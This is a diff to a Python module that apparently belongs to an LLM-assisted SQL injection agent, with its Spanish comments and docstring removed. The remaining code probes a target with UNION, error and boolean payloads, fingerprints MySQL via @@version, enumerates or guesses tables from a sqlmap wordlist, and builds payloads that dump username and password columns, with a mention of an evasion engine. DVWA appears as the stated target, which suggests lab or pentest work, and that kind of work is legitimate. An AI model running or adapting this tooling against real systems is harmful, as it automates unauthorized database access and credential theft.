@@ -1,19 +1,3 @@
-"""Descubrimiento de esquema con VERIFICACIÓN por etapas para SQL injection.
-
-El agente AVERIGUA la estructura de la base de datos enviando consultas y leyendo las respuestas —
-nunca asume la tabla ni las columnas— y, como un pentester real (metodología OWASP WSTG-INPV-05),
-CONFIRMA cada etapa con técnicas independientes en vez de dar un paso por sentado:
-
-  * Inyección confirmada por varias vías: error-based, boolean-based (diferencial 1=1 vs 1=2) y
-    union-based (no una sola señal).
-  * Fingerprint del DBMS (@@version) antes de usar sintaxis específica de MySQL.
-  * Conteo de columnas validado por ORDER BY y cruzado con UNION.
-  * Extracción verificada: se comprueba que lo extraído parezca credenciales (hashes/secretos).
-
-La mecánica es determinista para que un modelo local pequeño sea fiable; la única decisión que
-queda para el LLM es cuáles de las columnas descubiertas son las credenciales. Habla con el
-exterior por un callback `probe(sql) -> ProbeResult`, que quien lo usa conecta al motor de evasión
-y al objetivo, así el descubrimiento no depende de DVWA en concreto."""
 from __future__ import annotations
 
 import re
@@ -41,13 +25,13 @@ class DiscoveryResult:
     quote: str = ""
     columns: int = 0
     reflected: list[int] = field(default_factory=list)
-    techniques: list[str] = field(default_factory=list)  # técnicas que confirmaron la inyección
-    dbms: str = ""                                        # @@version detectado
+    techniques: list[str] = field(default_factory=list)
+    dbms: str = ""
     tables: list[str] = field(default_factory=list)
     target_table: str = ""
     cred_columns: tuple[str, str] = ("", "")
     extracted: list[dict[str, str]] = field(default_factory=list)
-    verified: bool = False                               # la extracción parece credenciales reales
+    verified: bool = False
     final_payload: str = ""
     trace: list[str] = field(default_factory=list)
 
@@ -96,15 +80,10 @@ class SchemaDiscovery:
         if cs:
             self._log(res, f"base de conocimiento: {cs} payloads reales cargados "
                            f"(PayloadsAllTheThings) + plantillas por técnica")
-        baseline = self.probe("1")  # respuesta normal (sin inyección), para el test diferencial
+        baseline = self.probe("1")
 
-        # 0. DETECCIÓN con payloads REALES del corpus (PayloadsAllTheThings): se disparan de verdad
-        #    y se registra cuáles produjeron señal (error/reflexión). Es la munición de detección.
         self._corpus_detection(res)
 
-        # 1. Contexto de comillas + nº de columnas + columnas reflejadas, por BÚSQUEDA UNION.
-        #    Robusto: funciona aunque el objetivo NO muestre errores SQL (p. ej. DVWA high, que
-        #    ante una consulta inválida simplemente no devuelve filas en vez de mostrar el error).
         for quote in ("'", ""):
             for n in range(1, _MAX_COLUMNS + 1):
                 sents = [str(1000 + i) for i in range(n)]
@@ -123,22 +102,16 @@ class SchemaDiscovery:
         res.techniques.append("union-based")
         q = res.quote
 
-        # 2. VERIFICAR la inyección con técnicas independientes (OWASP WSTG-INPV-05).
         self._confirm_injection(res, q, baseline)
 
-        # 3. Fingerprint del DBMS antes de usar sintaxis específica de MySQL.
         self._fingerprint(res)
 
-        # 5. Enumerar las tablas de la base de datos actual.
         res.tables = self._col0(self._single(res, "table_name",
             " FROM information_schema.tables WHERE table_schema=database()"))
         if not res.tables:
-            # information_schema no devolvió nada (restringido/filtrado): se cae a ADIVINAR tablas
-            # con la wordlist de sqlmap (common-tables), igual que el modo --common-tables.
             res.tables = self._guess_tables(res)
         self._log(res, f"tablas={res.tables}")
 
-        # 6. Por cada tabla, leer sus columnas y decidir si tiene credenciales.
         for table in res.tables or [""]:
             cols = self._col0(self._single(res, "column_name",
                 f" FROM information_schema.columns WHERE table_name={_hexlit(table)}")) if table else []
@@ -150,8 +123,6 @@ class SchemaDiscovery:
         return res
 
     def _corpus_detection(self, res: DiscoveryResult) -> None:
-        """Dispara payloads de detección REALES del corpus (PayloadsAllTheThings) y registra cuáles
-        produjeron señal (error SQL o reflexión). Hace que el corpus se USE, no solo se cuente."""
         payloads = knowledge.detection_payloads(limit=6)
         if not payloads:
             return
@@ -168,8 +139,6 @@ class SchemaDiscovery:
             res.techniques.append("corpus-detection")
 
     def _guess_tables(self, res: DiscoveryResult, cap: int = 50) -> list[str]:
-        """Adivina tablas con la wordlist de sqlmap (common-tables) cuando no se puede enumerar:
-        por cada nombre, UNION ... FROM <tabla>; si devuelve filas sin error, la tabla existe."""
         found = []
         for t in knowledge.common_tables()[:cap]:
             r = self.probe(self._single(res, "1", f" FROM {t}"))
@@ -182,20 +151,17 @@ class SchemaDiscovery:
         return found
 
     def _confirm_injection(self, res: DiscoveryResult, q: str, baseline: ProbeResult) -> None:
-        """Confirma la inyección por vías independientes y registra la evidencia (OWASP WSTG)."""
         if self.probe(f"1{q}").db_error:
             res.techniques.append("error-based")
         true_r = self.probe(f"1{q} AND 1=1-- -")
         false_r = self.probe(f"1{q} AND 1=2-- -")
         if true_r.cells and not false_r.cells:
             res.techniques.append("boolean-based")
-        # cross-check del nº de columnas con ORDER BY (solo si el objetivo muestra errores)
         if self.probe(f"1{q} ORDER BY {res.columns + 1}-- -").db_error:
             res.trace.append(f"nº de columnas {res.columns} validado por ORDER BY")
         self._log(res, f"inyección confirmada por: {res.techniques}")
 
     def _fingerprint(self, res: DiscoveryResult) -> None:
-        """Detecta el motor de base de datos con @@version."""
         ver = self._col0(self._single(res, "@@version"))
         res.dbms = ver[0] if ver else ""
         low = res.dbms.lower()
@@ -205,9 +171,6 @@ class SchemaDiscovery:
 
     def build_dump_payload(self, res: DiscoveryResult) -> str:
         user_col, pass_col = res.cred_columns
-        # Técnica de extracción (UNION) tomada del DATASET y rellenada con el esquema descubierto;
-        # si el layout no es el estándar (2 columnas reflejadas) o el dataset falta, se construye
-        # de forma determinista para seguir siendo robusto.
         templates = knowledge.extraction_techniques().get("union", [])
         if templates and res.columns == 2 and res.reflected == [1, 2]:
             return knowledge.fill(templates[0], q=res.quote, ucol=user_col,
@@ -223,7 +186,6 @@ class SchemaDiscovery:
         return rows
 
     def _verify_extraction(self, res: DiscoveryResult) -> None:
-        """Comprueba que lo extraído parezca credenciales (hash o secreto no trivial)."""
         rows = res.extracted
         plausible = [
             r for r in rows
@@ -240,7 +202,6 @@ class SchemaDiscovery:
             self.extract(self.build_dump_payload(res), res)
         return res
 
-    # --- constructores de payload: ponen la(s) expresión(es) en la(s) posición(es) reflejada(s) ---
 
     def _single(self, res: DiscoveryResult, expr: str, from_clause: str = "") -> str:
         pos = res.reflected[0] if res.reflected else 1
